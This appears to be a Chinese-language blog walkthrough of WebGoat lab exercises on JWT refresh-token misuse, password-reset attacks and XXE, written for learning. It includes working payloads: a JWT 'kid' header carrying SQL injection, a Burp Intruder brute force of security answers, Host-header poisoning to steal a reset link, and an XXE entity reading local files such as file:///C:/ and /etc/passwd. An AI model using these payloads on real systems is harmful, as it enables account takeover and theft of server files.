在新式单页应用程序 （SPA） 中使用刷新令牌是否有意义？正如我们在本节中看到的 关于存储令牌，有两个选项：Web 存储或 cookie，这意味着刷新令牌就在 访问令牌，因此，如果访问令牌泄露，刷新令牌也可能被泄露。大多数时候 当然是有区别的。访问令牌在进行 API 调用时发送，刷新令牌仅发送 何时应获取新的访问令牌，在大多数情况下，该令牌是不同的终结点。如果你最终得到同样的 服务器，您可以选择仅使用访问令牌。</p>
<p>如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些不检查的杠杆作用 一遍又一遍地访问令牌。仅当用户需要新的访问令牌时才执行检查。 当然，可以只使用访问令牌。在服务器上，您存储的信息与存储的信息完全相同 存储 有关刷新令牌，请参阅上一段。这样，您每次都需要检查令牌，但这可能会 根据应用而适用。如果存储刷新令牌用于验证，则保护这些令牌也很重要（至少 使用哈希函数将它们存储在数据库中）。</p>
<h4 id="10-3">10.</h4>
<p>就如同session会有存活时长一样，JWT的access_token也是有相类似的机制。session失活后，系统会要求用户再次身份验证，通过则重新颁发session；JWT则可使用refresh token去刷新access token而无需再次身份验证。<br>
登陆获取 access token, refresh token</p>
<p>WebGoat中提到：</p>
<p>应在服务器端存储足够的信息，以验证用户是否仍然受信任。您可以考虑的事情有很多，比如存储IP地址，跟踪使用refresh token的次数（在access token的有效时间窗口中多次使用刷新令牌可能表示奇怪的行为，您可以撤销所有token，让用户再次进行身份验证）。还要跟踪哪个access token属于哪个refresh token，否则攻击者可能会使用攻击者的refresh token为其他用户获取新的access token，请参阅https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation,还可以检查用户的IP地址或地理位置。如果需要发出一个新的令牌，请检查位置是否仍然相同，如果不同，则撤销所有令牌，并让用户再次进行身份验证。</p>
<p>这段话中关键信息是，服务器中可能存在：未校验access token和refresh token是否属于同一个用户，导致A用户可使用自己的refresh token去刷新B用户的access token。<br>
WebGoat对于使用JWT的建议：</p>
<blockquote>
<p>使用jwt令牌的最佳位置是服务器之间的通信。在普通的web应用程序中，最好使用普通的旧cookies。</p>
</blockquote>
<p>根据题意，攻击者要利用Tom过期的刷新token来获取访问token，用Tom的账户购物</p>
<ul>
<li>如何使用刷新token：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000013151506">https://segmentfault.com/a/1190000013151506</a></li>
<li>请求header信息中需要带上authorization: {$token}</li>
</ul>
<p>点击here可以看到log</p>
<p>里面有token</p>
<p>解码后可以知道是tom的</p>
<p>然后点击购买抓包</p>
<p>把token放在Authorization: 后面</p>
<p>发送到repeater模块可以知道这个token是过期的</p>
<blockquote>
<p>授权标头的一部分发送,这通常是使用Bearer令牌标准进行的，其中token以&quot;Bearer &quot;前缀开头，后跟实际的token值。</p>
</blockquote>
<p>我们修改时间</p>
<blockquote>
<ol>
<li>exp（Expiration Time）：表示令牌的过期时间。它是一个时间戳，表示令牌在何时过期。该时间戳是使用纪元（Epoch）时间表示的，通常是以秒为单位的整数。</li>
<li>iat（Issued At）：表示令牌的签发时间。它也是一个时间戳，表示令牌是在何时被签发的。同样，该时间戳也是使用纪元时间表示的。</li>
</ol>
</blockquote>
<p>换算规则比如是Unix时间戳-&gt;北京时间</p>
<p>即1526217811-&gt;2018-05-13 21:23:31</p>
<p>我就是尽量大些就行了，发送即可</p>
<h4 id="11-2">11.</h4>
<p>这题我看writeup需要看源码。。。能找出sql漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lusuo/p/17825090.html">webgoat _v8.1全流程通关 - 让-雅克-卢梭 - 博客园 (cnblogs.com)</a></p>
<p>点击删除，抓包，获取token</p>
<p>更新数据，看源码利用了kid存在sql注入</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot; : &quot;&#x27;;select &#x27;MQ==&#x27; from jwt_key --&quot;,</span><br><span class="line">  &quot;typ&quot; : &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Email&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;Role&quot; : [ &quot;Cat&quot; ],</span><br><span class="line">  &quot;aud&quot; : &quot;webgoat.org&quot;,</span><br><span class="line">  &quot;exp&quot; : 5618905304,</span><br><span class="line">  &quot;iat&quot; : 5524210904,</span><br><span class="line">  &quot;iss&quot; : &quot;WebGoat Token Builder&quot;,</span><br><span class="line">  &quot;sub&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;username&quot; : &quot;Tom&quot;</span><br><span class="line">&#125;</span><br><span class="line">secert_key=1</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/31.png" alt=""></p>
<p>更换token就行了</p>
<h3 id="3-Password-reset（密码重置）">3.Password reset（密码重置）</h3>
<h4 id="2-6">2.</h4>
<p>Let’s first do a simple assignment to make sure you are able to read e-mails with WebWolf, first start WebWolf (see here) In the reset page below send an e-mail to (part behind the @ is not important) Open WebWolf and read the e-mail and login with your username and the password provided in the <a href="mailto:e-mail.username@webgoat.org">e-mail.username@webgoat.org</a></p>
<p>大概的意思就是叫你点击忘记密码用于重置密码，然后会发送一封mail给WebWolf，在WebWolf就可以看到你的新密码了，再回到登录页面重新输入账号和新密码就行了</p>
<h4 id="4-5">4.</h4>
<p>Security questions</p>
<p>This has been an issue and still is for a lot of websites, when you lost your password the website will ask you for a security question which you answered during the sign up process. Most of the time this list contains a fixed number of question and which sometimes even have a limited set of answers. In order to use this functionality a user should be able to select a question by itself and type in the answer as well. This way users will not share the question which makes it more difficult for an attacker.</p>
<p>One important thing to remember the answers to these security question(s) should be treated with the same level of security which is applied for storing a password in a database. If the database leaks an attacker should not be able to perform password reset based on the answer of the security question.</p>
<p>Users share so much information on social media these days it becomes difficult to use security questions for password resets, a good resource for security questions is: <a target="_blank" rel="noopener" href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a><br>
Assignment</p>
<p>Users can retrieve their password if they can answer the secret question properly. There is no lock-out mechanism on this ‘Forgot Password’ page. Your username is ‘webgoat’ and your favorite color is ‘red’. The goal is to retrieve the password of another user. Users you could try are: “tom”, “admin” and “larry”.</p>
<p>安全问题<br>
这一直是一个问题，对于许多网站来说仍然是一个问题，当您丢失密码时，网站会询问您 对于您在注册过程中回答的安全问题。大多数情况下，此列表包含一个固定的 问题的数量，有时甚至有一组有限的答案。为了使用此功能 用户应该能够自行选择问题并输入答案。这样用户就不会共享 这个问题使攻击者更加困难。</p>
<p>要记住的一件重要事情是，这些安全问题的答案应该以相同级别的 用于在数据库中存储密码的安全性。如果数据库泄漏，攻击者应该无法 根据安全问题的答案执行密码重置。</p>
<p>如今，用户在社交媒体上分享如此多的信息，因此很难将安全问题用于密码 重置，安全问题的一个很好的资源是： <a target="_blank" rel="noopener" href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a></p>
<p>分配<br>
如果用户可以正确回答密码问题，则可以检索其密码。没有锁定机制 这个“忘记密码”页面。您的用户名是“webgoat”，您最喜欢的颜色是“红色”。目标是检索 其他用户的密码。您可以尝试的用户是：“tom”、“admin”和“larry”。</p>
<p>这题就是要在一直用户名的情况下搜寻“最喜欢的颜色”</p>
<p>所以我们直接burp抓包，加入Intruder模块进行爆破</p>
<p>还是和上面一样集束炸弹（第四个），对tom和最喜欢的颜色打上标记</p>
<p>在payload set 1 添加上tom admin 和 larry</p>
<p>set 2 加入颜色字典</p>
<blockquote>
<p>可以在这里下载👉https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717</p>
</blockquote>
<p>开始爆破后（可能需要多次才能获取答案），通过状态码（200）和length的不同寻找答案</p>
<blockquote>
<p>因为答案最多三个，然后我们找最不同的就行了</p>
</blockquote>
<p>最终找到admin:green,tom:purple,larry:yellow</p>
<h4 id="5-9">5.</h4>
<p>好像是叫选几个不容易被推断出答案的身份验证把。。。</p>
<p>这个自己选&gt;2个就行了</p>
<h4 id="6-6">6.</h4>
<p>先用自己的账号发送重置密码的链接</p>
<p>会收到一封信，信里有重置密码的链接，样式为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/WebGoat/PasswordReset/reset/reset-password/2ad9c8c3-0cdc-4927-950f-ab348005dc4a</span><br></pre></td></tr></table></figure>
<p>后面应该是用户id，然后主要是<strong>因为重置链接不变且永久有效导致的问题</strong>，我们只需要把后面的id换成tom的字符串就行了</p>
<p>但是如何获取Tom呢</p>
<p>我们可以向tom邮箱发送重置链接的信，虽然这样可以生成tom的字符串，但是我们不能登录tom的邮箱</p>
<p>所以我们可以在向tom邮箱发送重置链接的信抓包，然后修改host:localhost:8080为9090,这样的话是请求经过WebWolf</p>
<blockquote>
<p>在数据包中，host表示接收这个请求的目的地的host，仅包括域名和端口号。例如，<a target="_blank" rel="noopener" href="http://test.pay.com:8090">test.pay.com:8090</a>。它是一个用于指定被请求资源的Internet主机和端口号的数据包头字段。</p>
</blockquote>
<p>然后去webWolf的incoming request模块可以看到请求（最新消息在最下面）</p>
<p>发现tom的字符串，替换重置密码链接后面的id就行了</p>
<h3 id="4-Secure-Passwords（密码安全）">4.Secure Passwords（密码安全）</h3>
<p>大部分都在讲如何构建一个安全的密码</p>
<h4 id="4-6">4.</h4>
<p>这个挺有意思的，可以知道你的密码强度（顺带一提测试博主的密码在不到2个月的时间就被爆破了。。。）</p>
<p>换了个强度高的密码需要100多年才能爆破（嘻嘻😏）</p>
<h2 id="5-Sensitive-Data-Exposure（敏感数据暴露）">5.Sensitive Data Exposure（敏感数据暴露）</h2>
<h3 id="1-Insecure-Login（不安全登录）">1.Insecure Login（不安全登录）</h3>
<p>不安全的登录</p>
<h4 id="2-7">2.</h4>
<p>其实就是模拟我们是中间人</p>
<p>被攻击人在登录时，我们截获数据包，可以看到用户名和密码明文传输</p>
<p>相当于就是不安全的登录</p>
<h2 id="6-XML-External-Entities（XXE）（XML外部实体）">6.XML External Entities（XXE）（XML外部实体）</h2>
<p>本 节 课 讲 授 了 如何 执行 XML 外部 实体 攻击 ， 以及如何 滥用 和 防范 它。</p>
<h3 id="0-基本概念">0 基本概念</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/412746?utm_source=zhihu&amp;utm_medium=bbs-ex&amp;utm_campaign=other&amp;utm_content=content">【安全攻防】深入浅出实战系列专题-XXE攻击-云社区-华为云 (huaweicloud.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websecurity-study/p/11348913.html">WEB安全——XML注入 - 灰羽· - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yang1234567898/article/details/122484013">（渗透学习）XXE漏洞原理 &amp; 挖掘 &amp; 利用 &amp; 防御_xxe漏洞挖掘-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45836474/article/details/107573925">XXE漏洞基础及简单利用_xxe漏洞的利用方法-CSDN博客</a></p>
<p>（这个写的很详细）<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞 - 先知社区 (aliyun.com)</a></p>
</blockquote>
<p>下面是我做的一些总结（不缺时间还是多看看别的大佬写的吧，本蒟蒻只能总结一些大佬的话😭）</p>
<h4 id="0-XML基础"><strong>0.XML基础</strong></h4>
<p>XML 指可扩展标记语言（Extensible Markup Language)，是一种与HTML类似的纯文本的标记语言，设计宗旨是为了传输数据，而非显示数据。是W3C的推荐标准。</p>
<blockquote>
<p>xml和html结构类似，不同的是：</p>
<ol>
<li><strong>XML 被设计用来传输和存储数据。</strong></li>
<li><strong>HTML 被设计用来显示数据。</strong></li>
</ol>
<p><strong>XML 文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</strong>（在下面DTD给的实例代码中强调了）</p>
</blockquote>
<h4 id="1-XML标签"><strong>1.XML标签</strong></h4>
<p>XML被设计为具有自我描述性，XML标签是没有被预定义的，需要自行定义标签与文档结构。如下为包含了标题、发送者、接受者、内容等信息的xml文档。</p>
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
<ul>
<li>元素</li>
<li>属性</li>
<li>实体</li>
<li>PCDATA</li>
<li>CDATA</li>
</ul>
<h5 id="1-每个构建模块的简要描述">1.每个构建模块的简要描述</h5>
<h6 id="1-元素"><strong>1. 元素</strong></h6>
<p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。实例:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;body text <span class="keyword">in</span> between&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>空的 HTML 元素的例子是 “hr”、“br” 以及 “img”。</p>
<h6 id="2-属性"><strong>2. 属性</strong></h6>
<p>属性可提供有关元素的额外信息 实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<h6 id="3-实体"><strong>3. 实体</strong></h6>
<p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
<h6 id="4-PCDATA"><strong>4. PCDATA</strong></h6>
<p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>
被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。</p>
<h6 id="5-CDATA"><strong>5. CDATA</strong></h6>
<p>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
<h5 id="2-XML语法规则"><strong>2.XML语法规则</strong></h5>
<blockquote>
<ul>
<li>
<p>XML文档必须有一个根元素</p>
</li>
<li>
<p>区分大小写</p>
<p>在标记中必须注意区分大小写，在XML中，<code>&lt;TEST&gt;</code>和<code>&lt;test&gt;</code>是两个截然不同的标记</p>
</li>
<li>
<p>要有正确的结束标记，即必须要有一个闭合标签</p>
<p>结束标记除了要和开始编辑在拼写和大小上完全相同，还必须在前面加上一个斜杠“/”</p>
<p>若开始标记<code>&lt;test&gt;</code>，结束标记则为<code>&lt;/test&gt;</code>。XML严格要求标记配对，HTML中的<code>&lt;br&gt;</code>、<code>&lt;hr&gt;</code>的元素形式在XML中是不合法的。当一对标记之间没有任何文本内容时，可以不写结束标记，在开始标记的末尾加上斜杠”/”来确认，例如：<code>&lt;test /&gt; </code>这样的标记被称为“空标记”。</p>
</li>
<li>
<p>标记要正确嵌套</p>
<p>在一个XML元素中允许包含其他XML元素，但这些元素之间必须满足嵌套性</p>
</li>
<li>
<p>有效使用属性，属性值必须加引号</p>
<p>标记中可以包含任意多个属性。在标记中，属性以名称/取值对出现，属性名不能重复，名称与取值之间用等号“=”分隔，且取值用引号引起来。</p>
<p>举个例子：&lt;衣服 品牌=“耐克” 类型=“T恤” &gt;</p>
</li>
<li>
<p>XML中空格会被保留</p>
</li>
<li>
<p>实体引用</p>
</li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!-- 标题（根元素） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-DTD"><strong>2.DTD</strong></h4>
<p>指文档类型定义(Document Type Definition)，通过定义根节点、元素（ELEMENT）、属性（ATTLIST）、实体（ENTITY）等约束了xml文档的内容按照指定的格式承载数据。</p>
<p>简单来说就是DTD可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。（所以说是可选~~）</p>
<p><strong>① 内部的 DOCTYPE 声明：</strong></p>
<p>格式为：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML 声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义 from 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义 head 元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义 body 元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>#PCDATA是XML约束文档中的一个概念，用于表示元素的内容是可解析的字符数据。在XML中，#PCDATA用于表示元素中包含的文本内容，它不能包含任何子元素。与CDATA不同，#PCDATA可以包含字符串、子元素和字符串与子元素的组合。在XML约束文档中，如DTD（Document Type Definition）类型约束文档，#PCDATA用于指定元素的内容或属性的取值范围等。</p>
</blockquote>
<p><strong>② 外部引用：</strong></p>
<p>格式为：<code>&lt;!DOCTYPE 根元素 SYSTEM ” 文件名 ”&gt; </code></p>
<p>如下xml代码引用了外部DTD，文件为“note.dtd”</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>note.dtd：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3-实体-2">3.实体</h4>
<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<ul>
<li>实体引用是对实体的引用。</li>
<li>实体可在内部或外部进行声明。</li>
</ul>
<p>简单来说：在DTD中通过<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>等方式定义实体，相当于定义变量的作用，可在文档内容中通过<code>&amp;实体名称；</code>的方式引用实体的值（变量的值）。</p>
<p>说一个很实际的例子</p>
<blockquote>
<p>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; ' &quot;</code> 替换 <code>&lt; &gt; &amp; ' &quot;</code> 。<br>
实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</p>
</blockquote>
<p>注意别搞混<code>&lt;!ENTITY</code> 和 <code>&lt;!ELEMENT</code></p>
<blockquote>
<p><code>&lt;!ENTITY</code> 用于定义实体引用，而 <code>&lt;!ELEMENT</code> 用于定义元素的结构和内容。实体引用通常用于引用外部资源，而元素定义则用于指定元素的结构和内容规则。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/1.png" alt=""></p>
<p>然后这是webgoat的解释：</p>
<p>一旦XML文档被解析器处理，它将用定义的常量“Jo Smith”替换定义的实体</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/2.png" alt=""></p>
<p>Java应用程序中，XML可用于将数据从客户端获取到服务器，我们都熟悉JSON API，我们也可以使用XML来获取信息。大多数情况下，框架会根据 xml 结构自动填充 Java 对象，例如</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/xxe/3.png" alt=""></p>
<p><strong>实体类型</strong>:实体分为多种类型，从使用范围的维度，分为参数实体（只能在DTD中引用）与非参数实体（可以在DTD中、文档内容中引用）。区别如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>样例</th>
<th>引用方式</th>
<th>使用范围与场景</th>
</tr>
</thead>
<tbody>
<tr>
<td>非参数实体</td>
<td><code>&lt;!ENTITY country &quot;中国&quot;&gt;</code></td>
<td>&amp;country;</td>
<td>在DTD中、文档内容中均可引用，一般用来取代重复的字符串</td>
</tr>
<tr>
<td>参数实体</td>
<td><code>&lt;!ENTITY % countrydefine &quot;xxx元素的DTD定义内容&quot;&gt;</code></td>
<td>%country;</td>
<td>仅能在DTD定义中引用，一般用来保存某段重复的DTD定义</td>
</tr>
</tbody>
</table>
<p>从值的来源维度，分为内部实体、外部实体。内部实体为文档内部直接定义值，外部实体为通过http、file等协议从文件外的某处获取内容作为实体的值。区别如下：</p>
<table>
<thead>
<tr>
<th></th>
<th>样例</th>
<th>特征与使用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td>内部实体</td>
<td><code>&lt;!ENTITY country &quot;中国&quot;&gt;</code></td>
<td>值是明确的字符串常量等，可以直接定义在本文档中</td>
</tr>
<tr>
<td>外部实体</td>
<td><code>&lt;!ENTITY country SYSTEM &quot;file:///D:/country.txt&quot;&gt;</code></td>
<td>值来源于其它文件或者网络</td>
</tr>
</tbody>
</table>
<h4 id="4-XML外部实体注入"><strong>4.XML外部实体注入</strong></h4>
<p>XML External Entity Injection即xml外部实体注入漏洞，简称XXE漏洞。当xml解析器支持对于外部实体的解析且待解析的xml文件可由外部控制时，就会发生此攻击。攻击者可以通过构造外部实体的内容为本地其它目录下的文件、访问内网/外网的制定url等方式实现自己的攻击目的，达到信息泄露、命令执行、拒绝服务、SSRF、内网端口扫描等攻击目的。</p>
<h3 id="1-3">1-3</h3>
<p>建议看完上面的基本概念，再看一遍webgoat的，可以有更多理解</p>
<p>引用一位博主的话</p>
<p>下面是XXE注入的粗略理解（确实粗略易懂）</p>
<blockquote>
<p>XML声明，一般没啥，约束而已，都会写上</p>
<p>版本编码<?xml version="1.0" encoding="UTF-8"?> 文档类型定义(DTD)</p>
<p>重点在这！<strong>可以引用内部外部的实体</strong></p>
<p>如：<code>&lt;!ENTITY % name SYSTEM “file:///etc/passwd&quot;&gt;%name;</code>引用了不就调用了，是不是有点类似文件包含？这个实际上就是把“file:///etc/passwd”赋值给name，那如果<code>file:///etc/passwd</code>用户可控呢？改成http协议呢？没听懂，再解释一遍吧</p>
<p>XML外部实体 ‘name’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’ name’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’ name’实体的值将从其后的URI中读取，并把读取的内容替换name出现的地方。假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件（file:///etc/passwd)或者远程文件（<code>http://www.baidu.com/zzyy.txt）</code>]&gt; &lt;元素名称 category=“属性”&gt;文本或其他元素&lt;/元素名称&gt;</p>
<p>总结一下：XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>ENTITY 实体，在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的“别名”，即一个ENTITY，然后在这些文档中需要该数据的地方调用它。</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/109560492">https://blog.csdn.net/zy15667076526/article/details/109560492</a></p>
</blockquote>
<h3 id="4-7">4.</h3>
<p>在此作业中，您将为照片添加注释，在提交表单时尝试执行 XXE 使用注释字段进行注入。尝试列出文件系统的根目录。</p>
<p>先抓包看看</p>
<p>你可以看发送的数据包携带的数据是xml,说明用户可控</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;comment&gt;&lt;text&gt;666&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p>添加payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any[</span><br><span class="line">&lt;!ENTITY flag SYSTEM &#x27;file:///C:/&#x27;&gt; </span><br><span class="line">&lt;!-- file:// 表示这是一个文件协议的URL，/C:/ 表示C盘的根目录。--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;</span><br><span class="line">&amp;flag;</span><br><span class="line">&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p>就可以看到flag了，并且评论区也有返回的数据</p>
<h3 id="5-6">5-6</h3>
<p>5是指导你攻击的，6是代码审计角度发现XXE</p>
